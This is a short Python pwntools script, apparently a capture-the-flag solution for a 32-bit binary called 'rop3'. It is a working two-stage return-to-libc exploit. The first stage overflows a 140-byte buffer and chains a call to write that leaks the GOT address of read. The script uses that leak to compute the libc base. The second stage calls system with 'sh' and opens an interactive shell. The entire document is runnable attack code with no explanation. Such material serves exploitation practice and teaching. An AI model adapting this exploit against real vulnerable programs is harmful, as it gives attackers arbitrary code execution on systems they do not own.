#!/usr/bin/env python

from pwn import *

binary = './rop3-7f3312fe43c46d26'

libc = ELF('/lib/i386-linux-gnu/i686/cmov/libc.so.6')
elf = ELF(binary)

r = process(binary)

payload = "A" * 140
payload += p32(elf.plt['write'])
payload += p32(0x8048474)       # return address from write, to trigger again the vulnerable_function
payload += p32(0x01)            # stdout
payload += p32(elf.got['read']) # leaking the 'read' address from got
payload += p32(0x04)            # number of leaked bytes
r.sendline(payload)
read_leak = u32(r.recv(4))

libc.address = read_leak - libc.symbols['read']
print "[+] libc base address: " + hex(libc.address)

payload = "A" * 140
payload += p32(libc.symbols['system'])
payload += "????" # arbitrary return addr from system
payload += p32(next(libc.search('sh\x00')))

r.sendline(payload)
r.interactive()
